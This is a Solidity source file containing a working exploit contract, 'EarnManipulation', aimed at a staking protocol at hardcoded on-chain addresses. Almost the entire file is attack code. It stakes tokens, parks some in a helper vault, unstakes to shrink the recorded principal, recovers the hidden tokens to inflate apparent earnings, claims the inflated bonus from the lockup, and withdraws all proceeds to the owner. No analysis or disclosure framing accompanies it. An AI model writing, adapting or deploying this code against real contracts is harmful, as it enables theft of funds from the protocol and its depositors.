// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IHyperStaking {
    function stake(uint256 _amount, address _recipient) external returns (bool);
    function unstake(uint256 _amount, uint256 _bonus, bool _trigger) external;
    function getBonus(address _depositor) external view returns (uint256);
    function getLoyaltyRatio(address _depositor) external view returns (uint8);
    function bonusInfo(address _user) external view returns (uint256 epoch, uint256 principal);
    function rebase() external;
    function epoch() external view returns (uint256 length, uint256 number, uint256 endBlock, uint256 distribute);
}

interface IStakingLockup {
    function claim(bool _stake) external;
    function claimInfo(address _depositor) external view returns (uint256 payout, uint256 vesting, uint256 lastTime, uint256 unstakeTime);
    function percentVestedFor(address _depositor) external view returns (uint256);
    function pendingPayoutFor(address _depositor) external view returns (uint256);
    function claimPeriod() external view returns (uint256);
}

contract KISSVault {
    address public immutable owner;
    address public immutable kiss;
    constructor(address _kiss) {
        owner = msg.sender;
        kiss = _kiss;
    }

    function withdraw() external {
        require(msg.sender == owner, "!owner");
        uint256 bal = IERC20(kiss).balanceOf(address(this));
        if (bal > 0) {
            IERC20(kiss).transfer(owner, bal);
        }
    }

    function withdrawTo(address to) external {
        require(msg.sender == owner, "!owner");
        uint256 bal = IERC20(kiss).balanceOf(address(this));
        if (bal > 0) {
            IERC20(kiss).transfer(to, bal);
        }
    }
}

contract EarnManipulation {
    address public constant STAKING = 0x31dd9Be51cC7A96359cAaE6Cb4f5583C89D81985;
    address public constant LOCKUP = 0x963D655522C6360Df782C27912d7A74Ab89D98D9;
    address public constant LOVE = 0x9505dbD77DaCD1F6C89F101b98522D4b871d88C5;
    address public constant KISS = 0x67e248F9810D4D121ab2237Eb33D21f646011720;
    address public constant HUG = 0x153629b8CE84F5e6DD6044af779aA37aDB431393;

    address public owner;
    KISSVault public vault;
    uint256 public originalPrincipal;
    uint256 public manipulatedPrincipal;
    uint256 public inflatedEarned;
    uint256 public bonusClaimed;

    event PrincipalManipulated(uint256 original, uint256 manipulated, uint256 reduction);
    event BonusClaimed(uint256 bonusAmount, uint256 totalToLockup);
    event LOVEClaimed(uint256 amount);
    event ExploitComplete(uint256 totalProfit);

    constructor() {
        owner = msg.sender;
        vault = new KISSVault(KISS);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function step1_stake(uint256 amount) external onlyOwner {
        IERC20(LOVE).transferFrom(msg.sender, address(this), amount);
        IERC20(LOVE).approve(STAKING, amount);
        IHyperStaking(STAKING).stake(amount, address(this));
        (, originalPrincipal) = IHyperStaking(STAKING).bonusInfo(address(this));
    }

    function step2_hideKISS(uint256 percentToHide) external onlyOwner {
        require(percentToHide <= 99, "Max 99%");
        uint256 balance = IERC20(KISS).balanceOf(address(this));
        uint256 amountToHide = balance * percentToHide / 100;
        IERC20(KISS).transfer(address(vault), amountToHide);
    }

    function step3_manipulatePrincipal(uint256 unstakeAmount) external onlyOwner {
        IERC20(KISS).approve(STAKING, unstakeAmount);
        IHyperStaking(STAKING).unstake(unstakeAmount, 0, false);
        (, manipulatedPrincipal) = IHyperStaking(STAKING).bonusInfo(address(this));

        emit PrincipalManipulated(
            originalPrincipal,
            manipulatedPrincipal,
            originalPrincipal - manipulatedPrincipal
        );
    }

    function step4_recoverKISS() external onlyOwner {
        vault.withdraw();
        uint256 currentBalance = IERC20(KISS).balanceOf(address(this));
        inflatedEarned = currentBalance > manipulatedPrincipal
            ? currentBalance - manipulatedPrincipal
            : 0;
    }

    function executeManipulation(uint256 stakeAmount, uint256 hidePercent, uint256 unstakeAmount) external onlyOwner {
        // Stake
        IERC20(LOVE).transferFrom(msg.sender, address(this), stakeAmount);
        IERC20(LOVE).approve(STAKING, stakeAmount);
        IHyperStaking(STAKING).stake(stakeAmount, address(this));
        (, originalPrincipal) = IHyperStaking(STAKING).bonusInfo(address(this));

        // Hide KISS
        uint256 balance = IERC20(KISS).balanceOf(address(this));
        uint256 amountToHide = balance * hidePercent / 100;
        IERC20(KISS).transfer(address(vault), amountToHide);

        // Manipulate principal
        uint256 remaining = IERC20(KISS).balanceOf(address(this));
        uint256 toUnstake = unstakeAmount > 0 ? unstakeAmount : remaining / 2;
        IERC20(KISS).approve(STAKING, toUnstake);
        IHyperStaking(STAKING).unstake(toUnstake, 0, false);
        (, manipulatedPrincipal) = IHyperStaking(STAKING).bonusInfo(address(this));

        // Recover KISS
        vault.withdraw();
        uint256 currentBalance = IERC20(KISS).balanceOf(address(this));
        inflatedEarned = currentBalance > manipulatedPrincipal
            ? currentBalance - manipulatedPrincipal
            : 0;

        emit PrincipalManipulated(
            originalPrincipal,
            manipulatedPrincipal,
            originalPrincipal - manipulatedPrincipal
        );
    }

    function step5_claimBonus(uint256 unstakeKissAmount) external onlyOwner {
        uint256 bonus = IHyperStaking(STAKING).getBonus(address(this));
        require(bonus > 0, "No bonus available");
        uint256 hugBalance = IERC20(HUG).balanceOf(address(this));
        uint256 claimableBonus = bonus > hugBalance ? hugBalance : bonus;
        require(claimableBonus > 0, "Need HUG tokens to claim bonus");
        uint256 kissBalance = IERC20(KISS).balanceOf(address(this));
        uint256 kissToUnstake = unstakeKissAmount > kissBalance ? kissBalance : unstakeKissAmount;

        if (kissToUnstake > 0) {
            IERC20(KISS).approve(STAKING, kissToUnstake);
        }

        IHyperStaking(STAKING).unstake(kissToUnstake, claimableBonus, true);
        bonusClaimed = claimableBonus;
        emit BonusClaimed(claimableBonus, kissToUnstake + claimableBonus);
    }

    function step5_claimMaxBonus() external onlyOwner {
        uint256 bonus = IHyperStaking(STAKING).getBonus(address(this));
        uint256 hugBalance = IERC20(HUG).balanceOf(address(this));
        uint256 claimableBonus = bonus > hugBalance ? hugBalance : bonus;
        require(claimableBonus > 0, "No claimable bonus");
        uint256 kissBalance = IERC20(KISS).balanceOf(address(this));
        IERC20(KISS).approve(STAKING, kissBalance);
        IHyperStaking(STAKING).unstake(kissBalance, claimableBonus, true);
        bonusClaimed = claimableBonus;
        emit BonusClaimed(claimableBonus, kissBalance + claimableBonus);
    }

    function step6_claimFromLockup() external onlyOwner {
        uint256 beforeBalance = IERC20(LOVE).balanceOf(address(this));
        IStakingLockup(LOCKUP).claim(false);
        uint256 afterBalance = IERC20(LOVE).balanceOf(address(this));
        uint256 claimed = afterBalance - beforeBalance;
        emit LOVEClaimed(claimed);
    }

    function step7_withdrawToOwner() external onlyOwner {
        vault.withdrawTo(owner);
        uint256 loveBal = IERC20(LOVE).balanceOf(address(this));
        uint256 kissBal = IERC20(KISS).balanceOf(address(this));
        uint256 hugBal = IERC20(HUG).balanceOf(address(this));
        if (loveBal > 0) IERC20(LOVE).transfer(owner, loveBal);
        if (kissBal > 0) IERC20(KISS).transfer(owner, kissBal);
        if (hugBal > 0) IERC20(HUG).transfer(owner, hugBal);

        emit ExploitComplete(loveBal);
    }

    function step6and7_claimAndWithdraw() external onlyOwner {
        IStakingLockup(LOCKUP).claim(false);
        vault.withdrawTo(owner);
        uint256 loveBal = IERC20(LOVE).balanceOf(address(this));
        uint256 kissBal = IERC20(KISS).balanceOf(address(this));
        uint256 hugBal = IERC20(HUG).balanceOf(address(this));
        if (loveBal > 0) IERC20(LOVE).transfer(owner, loveBal);
        if (kissBal > 0) IERC20(KISS).transfer(owner, kissBal);
        if (hugBal > 0) IERC20(HUG).transfer(owner, hugBal);

        emit ExploitComplete(loveBal);
    }

    function getExploitState() external view returns (
        uint256 kissBalance,
        uint256 loveBalance,
        uint256 hugBalance,
        uint256 currentPrincipal,
        uint256 currentEarned,
        uint256 availableBonus,
        uint8 loyaltyRatio
    ) {
        kissBalance = IERC20(KISS).balanceOf(address(this));
        loveBalance = IERC20(LOVE).balanceOf(address(this));
        hugBalance = IERC20(HUG).balanceOf(address(this));
        (, currentPrincipal) = IHyperStaking(STAKING).bonusInfo(address(this));
        currentEarned = kissBalance > currentPrincipal ? kissBalance - currentPrincipal : 0;
        availableBonus = IHyperStaking(STAKING).getBonus(address(this));
        loyaltyRatio = IHyperStaking(STAKING).getLoyaltyRatio(address(this));
    }

    function getLockupStatus() external view returns (
        uint256 pendingPayout,
        uint256 vestingRemaining,
        uint256 lastClaimTime,
        uint256 unstakeTime,
        uint256 percentVested,
        bool canClaimFull
    ) {
        (pendingPayout, vestingRemaining, lastClaimTime, unstakeTime) = IStakingLockup(LOCKUP).claimInfo(address(this));
        percentVested = IStakingLockup(LOCKUP).percentVestedFor(address(this));
        canClaimFull = percentVested >= 10000;
    }

    function getEpochInfo() external view returns (
        uint256 epochLength,
        uint256 epochNumber,
        uint256 endBlock,
        uint256 distribute
    ) {
        (epochLength, epochNumber, endBlock, distribute) = IHyperStaking(STAKING).epoch();
    }

    function canClaimFromLockup() external view returns (bool) {
        uint256 percentVested = IStakingLockup(LOCKUP).percentVestedFor(address(this));
        return percentVested >= 10000;
    }

    function timeUntilFullClaim() external view returns (uint256) {
        (,uint256 vesting, uint256 lastTime,) = IStakingLockup(LOCKUP).claimInfo(address(this));
        if (vesting == 0) return 0;

        uint256 elapsed = block.timestamp - lastTime;
        if (elapsed >= vesting) return 0;
        return vesting - elapsed;
    }

    function triggerRebase() external {
        IHyperStaking(STAKING).rebase();
    }

    function depositHUG(uint256 amount) external onlyOwner {
        IERC20(HUG).transferFrom(msg.sender, address(this), amount);
    }

    function withdrawToken(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) {
            IERC20(token).transfer(owner, bal);
        }
    }

    function emergencyWithdraw() external onlyOwner {
        vault.withdrawTo(owner);
        uint256 loveBal = IERC20(LOVE).balanceOf(address(this));
        uint256 kissBal = IERC20(KISS).balanceOf(address(this));
        uint256 hugBal = IERC20(HUG).balanceOf(address(this));
        if (loveBal > 0) IERC20(LOVE).transfer(owner, loveBal);
        if (kissBal > 0) IERC20(KISS).transfer(owner, kissBal);
        if (hugBal > 0) IERC20(HUG).transfer(owner, hugBal);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
    }
}
